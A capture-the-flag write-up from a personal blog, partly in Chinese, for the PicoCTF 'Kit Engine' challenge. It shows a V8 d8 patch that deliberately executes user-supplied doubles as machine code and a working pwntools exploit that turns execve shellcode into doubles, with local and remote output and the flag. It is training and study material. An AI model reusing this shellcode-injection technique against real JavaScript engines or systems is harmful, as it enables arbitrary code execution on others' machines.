<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  PicoCTF - Kit Engine
  #


  Background
  #

Google V8 Engine

V8 引擎是 Google 做出來讓 JS 跟瀏覽器溝通的的開源專案，這個引擎被使用的非常廣泛，在 Chrome 瀏覽器跟 Node.js ，以及桌面應用程式框架 Electron 之中都有他的身影。而在 V8 出現前，最早最早的 JavaScript 引擎，叫做 SpiderMonkey ，同時也是另一個知名瀏覽器 FireFox 的渲染引擎。
Using d8

d8 is V8’s own developer shell.
d8 is useful for running some JavaScript locally or debugging changes you have made to V8. Building V8 using GN for x64 outputs a d8 binary in out.gn/x64.optdebug/d8. You can call d8 with the &ndash;help argument for more information about usage and flags."><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---kit-engine/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="PicoCTF - Kit Engine"><meta property="og:description" content="PicoCTF - Kit Engine # Background # Google V8 Engine
V8 引擎是 Google 做出來讓 JS 跟瀏覽器溝通的的開源專案，這個引擎被使用的非常廣泛，在 Chrome 瀏覽器跟 Node.js ，以及桌面應用程式框架 Electron 之中都有他的身影。而在 V8 出現前，最早最早的 JavaScript 引擎，叫做 SpiderMonkey ，同時也是另一個知名瀏覽器 FireFox 的渲染引擎。
Using d8
d8 is V8’s own developer shell.
d8 is useful for running some JavaScript locally or debugging changes you have made to V8. Building V8 using GN for x64 outputs a d8 binary in out.gn/x64.optdebug/d8. You can call d8 with the –help argument for more information about usage and flags."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="PicoCTF"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><title>PicoCTF - Kit Engine | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---kit-engine/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>PicoCTF - Kit Engine</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---build-shell-code--transfer-data-type>Exploit - Build Shell Code & Transfer Data Type</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=picoctf---kit-engine>PicoCTF - Kit Engine
<a class=anchor href=#picoctf---kit-engine>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://ithelp.ithome.com.tw/articles/10216397>Google V8 Engine</a></p><blockquote><p>V8 引擎是 Google 做出來讓 JS 跟瀏覽器溝通的的開源專案，這個引擎被使用的非常廣泛，在 Chrome 瀏覽器跟 Node.js ，以及桌面應用程式框架 Electron 之中都有他的身影。而在 V8 出現前，最早最早的 JavaScript 引擎，叫做 SpiderMonkey ，同時也是另一個知名瀏覽器 FireFox 的渲染引擎。</p></blockquote><p><a href=https://v8.dev/docs/d8>Using d8</a></p><blockquote><p>d8 is V8’s own developer shell.</p><p>d8 is useful for running some JavaScript locally or debugging changes you have made to V8. Building V8 using GN for x64 outputs a d8 binary in out.gn/x64.optdebug/d8. You can call d8 with the &ndash;help argument for more information about usage and flags.</p></blockquote><p><a href=https://stackoverflow.com/questions/5415/convert-bytes-to-floating-point-numbers>Convert Bytes to Floating Point Numbers?</a></p><blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#f92672>import</span> struct
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;f&#39;</span>, <span style=color:#ae81ff>3.141592654</span>)
</span></span><span style=display:flex><span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\xdb\x0f</span><span style=color:#e6db74>I@&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> struct<span style=color:#f92672>.</span>unpack(<span style=color:#e6db74>&#39;f&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\xdb\x0f</span><span style=color:#e6db74>I@&#39;</span>)
</span></span><span style=display:flex><span>(<span style=color:#ae81ff>3.1415927410125732</span>,)
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;4f&#39;</span>, <span style=color:#ae81ff>1.0</span>, <span style=color:#ae81ff>2.0</span>, <span style=color:#ae81ff>3.0</span>, <span style=color:#ae81ff>4.0</span>)
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00\x00\x80</span><span style=color:#e6db74>?</span><span style=color:#ae81ff>\x00\x00\x00</span><span style=color:#e6db74>@</span><span style=color:#ae81ff>\x00\x00</span><span style=color:#e6db74>@@</span><span style=color:#ae81ff>\x00\x00\x80</span><span style=color:#e6db74>@&#39;</span>
</span></span></code></pre></div></blockquote><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Patch</p><pre tabindex=0><code>diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index e6fb20d152..35195b9261 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -979,6 +979,53 @@ struct ModuleResolutionData {
 
 }  // namespace
 
+uint64_t doubleToUint64_t(double d){
+  union {
+    double d;
+    uint64_t u;
+  } conv = { .d = d };
+  return conv.u;
+}
+
+void Shell::Breakpoint(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args) {
+  __asm__(&#34;int3&#34;);
+}
+
+void Shell::AssembleEngine(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args) {
+  Isolate* isolate = args.GetIsolate();
+  if(args.Length() != 1) {
+    return;
+  }
+
+  double *func = (double *)mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  if (func == (double *)-1) {
+    printf(&#34;Unable to allocate memory. Contact admin\n&#34;);
+    return;
+  }
+
+  if (args[0]-&gt;IsArray()) {
+    Local&lt;Array&gt; arr = args[0].As&lt;Array&gt;();
+
+    Local&lt;Value&gt; element;
+    for (uint32_t i = 0; i &lt; arr-&gt;Length(); i++) {
+      if (arr-&gt;Get(isolate-&gt;GetCurrentContext(), i).ToLocal(&amp;element) &amp;&amp; element-&gt;IsNumber()) {
+        Local&lt;Number&gt; val = element.As&lt;Number&gt;();
+        func[i] = val-&gt;Value();
+      }
+    }
+
+    printf(&#34;Memory Dump. Watch your endianness!!:\n&#34;);
+    for (uint32_t i = 0; i &lt; arr-&gt;Length(); i++) {
+      printf(&#34;%d: float %f hex %lx\n&#34;, i, func[i], doubleToUint64_t(func[i]));
+    }
+
+    printf(&#34;Starting your engine!!\n&#34;);
+    void (*foo)() = (void(*)())func;
+    foo();
+  }
+  printf(&#34;Done\n&#34;);
+}
+
 void Shell::ModuleResolutionSuccessCallback(
     const FunctionCallbackInfo&lt;Value&gt;&amp; info) {
   std::unique_ptr&lt;ModuleResolutionData&gt; module_resolution_data(
@@ -2201,40 +2248,15 @@ Local&lt;String&gt; Shell::Stringify(Isolate* isolate, Local&lt;Value&gt; value) {
 
 Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);
-  global_template-&gt;Set(Symbol::GetToStringTag(isolate),
-                       String::NewFromUtf8Literal(isolate, &#34;global&#34;));
+  // Add challenge builtin, and remove some unintented solutions
+  global_template-&gt;Set(isolate, &#34;AssembleEngine&#34;, FunctionTemplate::New(isolate, AssembleEngine));
+  global_template-&gt;Set(isolate, &#34;Breakpoint&#34;, FunctionTemplate::New(isolate, Breakpoint));
   global_template-&gt;Set(isolate, &#34;version&#34;,
                        FunctionTemplate::New(isolate, Version));
-
   global_template-&gt;Set(isolate, &#34;print&#34;, FunctionTemplate::New(isolate, Print));
-  global_template-&gt;Set(isolate, &#34;printErr&#34;,
-                       FunctionTemplate::New(isolate, PrintErr));
-  global_template-&gt;Set(isolate, &#34;write&#34;, FunctionTemplate::New(isolate, Write));
-  global_template-&gt;Set(isolate, &#34;read&#34;, FunctionTemplate::New(isolate, Read));
-  global_template-&gt;Set(isolate, &#34;readbuffer&#34;,
-                       FunctionTemplate::New(isolate, ReadBuffer));
-  global_template-&gt;Set(isolate, &#34;readline&#34;,
-                       FunctionTemplate::New(isolate, ReadLine));
-  global_template-&gt;Set(isolate, &#34;load&#34;, FunctionTemplate::New(isolate, Load));
-  global_template-&gt;Set(isolate, &#34;setTimeout&#34;,
-                       FunctionTemplate::New(isolate, SetTimeout));
-  // Some Emscripten-generated code tries to call &#39;quit&#39;, which in turn would
-  // call C&#39;s exit(). This would lead to memory leaks, because there is no way
-  // we can terminate cleanly then, so we need a way to hide &#39;quit&#39;.
   if (!options.omit_quit) {
     global_template-&gt;Set(isolate, &#34;quit&#34;, FunctionTemplate::New(isolate, Quit));
   }
-  global_template-&gt;Set(isolate, &#34;testRunner&#34;,
-                       Shell::CreateTestRunnerTemplate(isolate));
-  global_template-&gt;Set(isolate, &#34;Realm&#34;, Shell::CreateRealmTemplate(isolate));
-  global_template-&gt;Set(isolate, &#34;performance&#34;,
-                       Shell::CreatePerformanceTemplate(isolate));
-  global_template-&gt;Set(isolate, &#34;Worker&#34;, Shell::CreateWorkerTemplate(isolate));
-  // Prevent fuzzers from creating side effects.
-  if (!i::FLAG_fuzzing) {
-    global_template-&gt;Set(isolate, &#34;os&#34;, Shell::CreateOSTemplate(isolate));
-  }
-  global_template-&gt;Set(isolate, &#34;d8&#34;, Shell::CreateD8Template(isolate));
 
 #ifdef V8_FUZZILLI
   global_template-&gt;Set(
@@ -2243,11 +2265,6 @@ Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) {
       FunctionTemplate::New(isolate, Fuzzilli), PropertyAttribute::DontEnum);
 #endif  // V8_FUZZILLI
 
-  if (i::FLAG_expose_async_hooks) {
-    global_template-&gt;Set(isolate, &#34;async_hooks&#34;,
-                         Shell::CreateAsyncHookTemplate(isolate));
-  }
-
   return global_template;
 }
 
@@ -2449,10 +2466,10 @@ void Shell::Initialize(Isolate* isolate, D8Console* console,
             v8::Isolate::kMessageLog);
   }
 
-  isolate-&gt;SetHostImportModuleDynamicallyCallback(
+  /*isolate-&gt;SetHostImportModuleDynamicallyCallback(
       Shell::HostImportModuleDynamically);
   isolate-&gt;SetHostInitializeImportMetaObjectCallback(
-      Shell::HostInitializeImportMetaObject);
+      Shell::HostInitializeImportMetaObject);*/
 
 #ifdef V8_FUZZILLI
   // Let the parent process (Fuzzilli) know we are ready.
diff --git a/src/d8/d8.h b/src/d8/d8.h
index a6a1037cff..4591d27f65 100644
--- a/src/d8/d8.h
+++ b/src/d8/d8.h
@@ -413,6 +413,9 @@ class Shell : public i::AllStatic {
     kNoProcessMessageQueue = false
   };
 
+  static void AssembleEngine(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args);
+  static void Breakpoint(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args);
+
   static bool ExecuteString(Isolate* isolate, Local&lt;String&gt; source,
                             Local&lt;Value&gt; name, PrintResult print_result,
                             ReportExceptions report_exceptions,
</code></pre><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題很有趣，不過我原本不知道v8或d8是啥東東，以為是類似老舊攝影機???但看了<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup><sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>的WP，發現沒有想像中的複雜，首先他給了一個d8(也就是local端可以使用的v8，類似psysh的感覺，可以執行js的環境)，然後他有給一個patch，所以不用管其他的部分，只要專注在他patch的內容即可。</p><ol><li>diff
從patch file可以看得出來他新實作了三個function: <code>uint64_t doubleToUint64_t(double d)</code>, <code>void Shell::Breakpoint(const v8::FunctionCallbackInfo&lt;v8::Value>& args)</code>, <code>void Shell::AssembleEngine(const v8::FunctionCallbackInfo&lt;v8::Value>& args)</code>，其中<code>Breakpoint</code>和<code>AssembleEngine</code>都是繼承Shell class，然後<code>AssembleEngine</code>需要傳入args的參數</li><li>Analyze <code>AssembleEngine</code> Function
在patch的33行中，會判斷傳入的args是不是array，然後array中每一個element都要是number，接著就會把value放到前面定義的func(其實就是function pointer)，再後面的for loop做的事情是把func中每一個element轉data type，從double轉成unsinged integer 64，接著就直接call這個function</li><li>Construct Payload
基於以上觀察，我們知道<code>AssembleEngine</code>可以直接執行我們給他的shellcode，只不過需要花心思在他的data type檢查，也就是args需要是array，且每一個element都必須是double才行</li></ol><h2 id=exploit---build-shell-code--transfer-data-type>Exploit - Build Shell Code & Transfer Data Type
<a class=anchor href=#exploit---build-shell-code--transfer-data-type>#</a></h2><pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *
import struct

context.arch = &#39;amd64&#39;

if args.REMOTE:
    ls = asm(shellcraft.execve(b&#34;/bin/ls&#34;, [&#34;ls&#34;]))
    cat = asm(shellcraft.execve(b&#34;/bin/cat&#34;, [&#34;cat&#34;, &#34;flag.txt&#34;]))
    r = remote(&#39;mercury.picoctf.net&#39;, 48700)
else:
    ls = b&#39;H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.cho.mr\x01H1\x04$H\x89\xe7hmr\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#39;
    cat = b&#39;j\x01\xfe\x0c$H\xb8/bin/catPH\x89\xe7h.txtH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8b`u\x01gm`fH1\x04$1\xf6Vj\x0c^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#39;
    r = process([&#39;python&#39;, &#39;server.py&#39;])
log.info(f&#39;ls shellcode: {ls}&#39;)
log.info(f&#39;cat flag.txt shellcode: {cat}&#39;)

def Transfer2DoubleArray(shellcode):
    shell_array = []
    if len(shellcode) % 8 &gt; 0:
        shellcode += (8 - len(shellcode) % 8) * b&#39;\x00&#39;
    for i in range(0, len(shellcode), 8):
        double_tmp = struct.unpack(&#39;d&#39;, shellcode[i:i+8])[0]
        shell_array.append(double_tmp)
    
    return shell_array



payload = f&#39;AssembleEngine({Transfer2DoubleArray(ls)})&#39;
r.recvuntil(b&#39;Provide size. Must be &lt; 5k:&#39;)
r.sendline(str(len(payload)).encode())
r.recvline()
r.sendline(payload.encode())
print(r.recvall().decode())
r.close()

if args.REMOTE:
    r = remote(&#39;mercury.picoctf.net&#39;, 48700)
else:
    r = process([&#39;python&#39;, &#39;server.py&#39;])
payload = f&#39;AssembleEngine({Transfer2DoubleArray(cat)})&#39;
r.recvuntil(b&#39;Provide size. Must be &lt; 5k:&#39;)
r.sendline(str(len(payload)).encode())
r.recvline()
r.sendline(payload.encode())
print(r.recvall().decode())
</code></pre><p>:::spoiler Local Result</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python exp.py
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;/home/sbk6401/anaconda3/envs/CTF/bin/python&#39;</span>: pid <span style=color:#ae81ff>19347</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ls shellcode: b<span style=color:#e6db74>&#39;H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.cho.mr\x01H1\x04$H\x89\xe7hmr\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> cat flag.txt shellcode: b<span style=color:#e6db74>&#39;j\x01\xfe\x0c$H\xb8/bin/catPH\x89\xe7h.txtH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8b`u\x01gm`fH1\x04$1\xf6Vj\x0c^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Receiving all data: Done <span style=color:#f92672>(</span>334B<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Process <span style=color:#e6db74>&#39;/home/sbk6401/anaconda3/envs/CTF/bin/python&#39;</span> stopped with exit code <span style=color:#ae81ff>0</span> <span style=color:#f92672>(</span>pid 19347<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>AssembleEngine<span style=color:#f92672>([</span>7.748604185565308e-304, 7.001521162788231e+194, 1.773290430551938e-288, 1.0748503232447379e-301, 7.748605141607601e-304, 1.776650735790609e-302, 3.6509617888350745e+206, 4.1942076e-316<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>File written. Running. Timeout is 20s
</span></span><span style=display:flex><span>Run Complete
</span></span><span style=display:flex><span>Stdout b<span style=color:#e6db74>&#39;d8\nexp-nickchen.py\nexp.py\nflag.txt\nserver.py\nsource\n&#39;</span>
</span></span><span style=display:flex><span>Stderr b<span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;/home/sbk6401/anaconda3/envs/CTF/bin/python&#39;</span>: pid <span style=color:#ae81ff>19366</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Receiving all data: Done <span style=color:#f92672>(</span>340B<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Process <span style=color:#e6db74>&#39;/home/sbk6401/anaconda3/envs/CTF/bin/python&#39;</span> stopped with exit code <span style=color:#ae81ff>0</span> <span style=color:#f92672>(</span>pid 19366<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>AssembleEngine<span style=color:#f92672>([</span>8.191473375206089e-79, 3.775826202043335e+79, 1.1205295651588473e+253, 7.748604185565308e-304, 2.460307022775963e+257, 1.7734484618746183e-288, 4.089989556334856e+40, 1.7766596360849696e-302, 3.6509617888350745e+206, 4.1942076e-316<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>File written. Running. Timeout is 20s
</span></span><span style=display:flex><span>Run Complete
</span></span><span style=display:flex><span>Stdout b<span style=color:#e6db74>&#39;picoCTF{test_132}&#39;</span>
</span></span><span style=display:flex><span>Stderr b<span style=color:#e6db74>&#39;&#39;</span>
</span></span></code></pre></div><p>:::
:::spoiler Remote Result</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python exp.py REMOTE
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to mercury.picoctf.net on port 48700: Done
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ls shellcode: b<span style=color:#e6db74>&#39;H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.cho.mr\x01H1\x04$H\x89\xe7hmr\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> cat flag.txt shellcode: b<span style=color:#e6db74>&#39;j\x01\xfe\x0c$H\xb8/bin/catPH\x89\xe7h.txtH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8b`u\x01gm`fH1\x04$1\xf6Vj\x0c^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Receiving all data: Done <span style=color:#f92672>(</span>334B<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Closed connection to mercury.picoctf.net port <span style=color:#ae81ff>48700</span>
</span></span><span style=display:flex><span>AssembleEngine<span style=color:#f92672>([</span>7.748604185565308e-304, 7.001521162788231e+194, 1.773290430551938e-288, 1.0748503232447379e-301, 7.748605141607601e-304, 1.776650735790609e-302, 3.6509617888350745e+206, 4.1942076e-316<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>File written. Running. Timeout is 20s
</span></span><span style=display:flex><span>Run Complete
</span></span><span style=display:flex><span>Stdout b<span style=color:#e6db74>&#39;d8\nflag.txt\nserver.py\nsource.tar.gz\nxinet_startup.sh\n&#39;</span>
</span></span><span style=display:flex><span>Stderr b<span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to mercury.picoctf.net on port 48700: Done
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Receiving all data: Done <span style=color:#f92672>(</span>362B<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Closed connection to mercury.picoctf.net port <span style=color:#ae81ff>48700</span>
</span></span><span style=display:flex><span>AssembleEngine<span style=color:#f92672>([</span>8.191473375206089e-79, 3.775826202043335e+79, 1.1205295651588473e+253, 7.748604185565308e-304, 2.460307022775963e+257, 1.7734484618746183e-288, 4.089989556334856e+40, 1.7766596360849696e-302, 3.6509617888350745e+206, 4.1942076e-316<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>File written. Running. Timeout is 20s
</span></span><span style=display:flex><span>Run Complete
</span></span><span style=display:flex><span>Stdout b<span style=color:#e6db74>&#39;picoCTF{vr00m_vr00m_48f07b402a4020e0}\n&#39;</span>
</span></span><span style=display:flex><span>Stderr b<span style=color:#e6db74>&#39;&#39;</span>
</span></span></code></pre></div><p>:::</p><p>Flag: <code>picoCTF{vr00m_vr00m_48f07b402a4020e0}</code></p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://nickchen120235.github.io/2022/04/22/kit-engine.html>V8 exploitation - picoCTF Kit Engine</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://blog.maple3142.net/2021/03/30/picoctf-2021-writeups/#kit-engine>Kit Engine - maple</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---build-shell-code--transfer-data-type>Exploit - Build Shell Code & Transfer Data Type</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>